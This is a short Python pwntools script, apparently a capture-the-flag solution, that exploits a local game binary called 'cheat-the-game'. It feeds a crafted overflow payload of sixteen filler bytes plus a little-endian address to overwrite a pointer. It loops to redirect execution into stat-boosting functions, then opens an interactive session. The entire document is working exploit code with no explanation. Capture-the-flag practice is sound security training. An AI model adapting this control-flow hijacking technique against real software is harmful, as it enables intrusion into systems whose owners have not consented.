# This code works, June 5th 2024

from pwn import *

# context.log_level = 'debug'
p = process('./cheat-the-game')


def solve(addr=0x0):
    p.recvuntil(b'>>>')
    p.sendline(b'3')

    p.recvuntil(b':')
    p.recvline()

    payload = b'A' * 16
    payload += addr.to_bytes(8, 'little')

    p.sendline(payload)

    p.recvuntil(b'>>>')
    p.sendline(b'2')


print_flag_addr = 0x401354  # This is fake...
incStr_addr = 0x4011D6
intInt_addr = 0x401205

p.recvuntil(b'>>>')
p.sendline(b'1')

p.recvuntil(b'Item Object:')
potion_addr = int(p.recvline(), 16)

p.recvuntil(b'>>>')
p.sendline(b'2')

for i in range(5):
    solve(incStr_addr)
    solve(intInt_addr)

p.recvuntil(b'>>>')
p.sendline(b'5')

p.interactive()
